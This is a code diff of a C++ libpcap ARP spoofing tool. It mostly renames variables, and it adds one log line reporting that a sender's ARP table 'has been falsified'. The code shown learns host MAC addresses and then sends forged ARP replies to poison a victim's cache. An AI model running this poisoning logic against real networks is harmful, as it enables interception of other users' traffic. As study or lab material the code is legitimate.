@@ -39,7 +39,7 @@ Mac getMyMacAddress(char* dev) {
   int fd;
 
   struct ifreq ifr;
-  Mac mac_address;
+  Mac madAddress;
 
   fd = socket(AF_INET, SOCK_DGRAM, 0);
 
@@ -50,9 +50,9 @@ Mac getMyMacAddress(char* dev) {
 
   close(fd);
 
-  mac_address = (uint8_t*)ifr.ifr_hwaddr.sa_data;
+  madAddress = (uint8_t*)ifr.ifr_hwaddr.sa_data;
 
-  return mac_address;
+  return madAddress;
 }
 
 // ref:
@@ -60,7 +60,7 @@ Mac getMyMacAddress(char* dev) {
 Ip getMyIpv4Address(const char* dev) {
   int fd;
   struct ifreq ifr;
-  uint32_t ip_address;
+  uint32_t ipAddress;
 
   fd = socket(AF_INET, SOCK_DGRAM, 0);
 
@@ -71,9 +71,9 @@ Ip getMyIpv4Address(const char* dev) {
 
   close(fd);
 
-  ip_address = ntohl((((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr).s_addr);
+  ipAddress = ntohl((((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr).s_addr);
 
-  return ip_address;
+  return ipAddress;
 }
 
 int sendArpPacket(pcap_t* handle, Mac ethernetDestinationMac,
@@ -128,7 +128,7 @@ int main(int argc, char* argv[]) {
   }
 
   Mac myMac = getMyMacAddress(dev);
-  Ip  my_ip = getMyIpv4Address(dev);
+  Ip  myIp = getMyIpv4Address(dev);
 
   map<Ip, Mac> macMap;
   Ip senderIp[(argc-2)/2];
@@ -143,7 +143,7 @@ int main(int argc, char* argv[]) {
 
   for (int i=0 ; i < (argc-2)/2 ; i++) {
     if (macMap.end() == macMap.find(senderIp[i])) {
-      res = sendArpRequest(handle, myMac, my_ip, senderIp[i]);
+      res = sendArpRequest(handle, myMac, myIp, senderIp[i]);
 
       if (res != 0) {
         printf("ERROR: pcap_sendpacket return %d error=%s\n", res,
@@ -170,22 +170,22 @@ int main(int argc, char* argv[]) {
           continue;
         }
 
-        ArpHdr* arpreply = (ArpHdr*)(packet + sizeof(EthHdr));
+        ArpHdr* replyArp = (ArpHdr*)(packet + sizeof(EthHdr));
 
-        if (arpreply->hrd() != ArpHdr::ETHER ||
-            arpreply->pro() != EthHdr::Ip4 || arpreply->op() != ArpHdr::Reply) {
+        if (replyArp->hrd() != ArpHdr::ETHER ||
+            replyArp->pro() != EthHdr::Ip4 || replyArp->op() != ArpHdr::Reply) {
           continue;
         }
 
-        if (arpreply->tmac() == myMac && arpreply->tip() == my_ip &&
-            arpreply->sip() == senderIp[i]) {
-          macMap.insert(make_pair(senderIp[i], (Mac)arpreply->smac()));
+        if (replyArp->tmac() == myMac && replyArp->tip() == myIp &&
+            replyArp->sip() == senderIp[i]) {
+          macMap.insert(make_pair(senderIp[i], (Mac)replyArp->smac()));
           break;
         }
       }
     }
     if (macMap.end() == macMap.find(targetIp[i])) {
-      res = sendArpRequest(handle, myMac, my_ip, targetIp[i]);
+      res = sendArpRequest(handle, myMac, myIp, targetIp[i]);
 
       if (res != 0) {
         printf("ERROR: pcap_sendpacket return %d error=%s\n", res,
@@ -212,16 +212,16 @@ int main(int argc, char* argv[]) {
           continue;
         }
 
-        ArpHdr* arpreply = (ArpHdr*)(packet + sizeof(EthHdr));
+        ArpHdr* replyArp = (ArpHdr*)(packet + sizeof(EthHdr));
 
-        if (arpreply->hrd() != ArpHdr::ETHER ||
-            arpreply->pro() != EthHdr::Ip4 || arpreply->op() != ArpHdr::Reply) {
+        if (replyArp->hrd() != ArpHdr::ETHER ||
+            replyArp->pro() != EthHdr::Ip4 || replyArp->op() != ArpHdr::Reply) {
           continue;
         }
 
-        if (arpreply->tmac() == myMac && arpreply->tip() == my_ip &&
-            arpreply->sip() == targetIp[i]) {
-          macMap.insert(make_pair(targetIp[i], (Mac)arpreply->smac()));
+        if (replyArp->tmac() == myMac && replyArp->tip() == myIp &&
+            replyArp->sip() == targetIp[i]) {
+          macMap.insert(make_pair(targetIp[i], (Mac)replyArp->smac()));
           break;
         }
       }
@@ -231,6 +231,7 @@ int main(int argc, char* argv[]) {
   for (int i=0 ; i < (argc-2)/2 ; i++) {
     if (macMap.end() != macMap.find(senderIp[i])) {
       res = sendArpReply(handle, myMac, targetIp[i], macMap.find(senderIp[i])->second, senderIp[i]);
+      printf("INFO: %d.%d.%d.%d's arp table has been falsified\n", senderIp[i]>>24&0xFF, senderIp[i]>>16&0xFF, senderIp[i]>>8&0xFF, senderIp[i]>>0&0xFF);
 
       if (res != 0) {
         printf("ERROR: pcap_sendpacket return %d error=%s\n", res,
